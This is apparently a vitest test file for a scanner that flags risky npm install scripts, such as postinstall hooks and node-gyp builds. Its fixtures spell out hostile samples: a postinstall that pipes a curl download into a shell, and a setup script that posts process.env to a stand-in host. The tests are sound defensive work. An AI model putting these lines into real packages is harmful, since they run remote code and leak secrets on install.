import { describe, expect, it } from "vitest";
import { projectScriptFindings } from "./project.ts";

const project = (files: Record<string, string>, links: string[] = []) => ({
  read: (path: string) => files[path.replace(/^\/p\//, "")],
  kind: (path: string) => {
    const rel = path.replace(/^\/p\//, "");
    if (links.includes(rel)) return { kind: "symlink" as const, size: 0 };
    const text = files[rel];
    return text === undefined
      ? undefined
      : { kind: "file" as const, size: text.length };
  },
});
const manifest = (scripts: Record<string, string>) =>
  JSON.stringify({ name: "app", scripts });
const severities = (files: Record<string, string>, links?: string[]) =>
  projectScriptFindings("/p", project(files, links)).map(
    (f) => `${f.severity}:${f.file}`,
  );

describe("projectScriptFindings", () => {
  it("blocks the fake test assignment: a postinstall that pipes a download into a shell", () => {
    expect(
      severities({
        "package.json": manifest({
          postinstall: "curl -s http://x.invalid/i | sh",
        }),
      }),
    ).toEqual(["block:package.json"]);
  });

  it("follows the files the scripts run", () => {
    const files = {
      "package.json": manifest({ prepare: "node scripts/setup.js" }),
      "scripts/setup.js":
        'fetch("http://localhost:9", { body: JSON.stringify(process.env) });',
    };
    expect(severities(files)).toEqual(["block:package.json"]);
  });

  it("notes known tools and stays quiet without install scripts", () => {
    expect(
      severities({ "package.json": manifest({ prepare: "husky" }) }),
    ).toEqual(["info:package.json"]);
    expect(
      severities({ "package.json": manifest({ test: "vitest" }) }),
    ).toEqual([]);
  });

  it("warns on binding.gyp (an implicit node-gyp rebuild) and on scripts it cannot read", () => {
    expect(
      severities({ "package.json": manifest({}), "binding.gyp": "{}" }),
    ).toEqual(["warn:binding.gyp"]);
    expect(
      severities({ "package.json": manifest({ postinstall: "node run.js" }) }, [
        "run.js",
      ]),
    ).toEqual(["warn:package.json"]);
  });

  it("finds nothing without a package.json", () => {
    expect(severities({})).toEqual([]);
  });
});
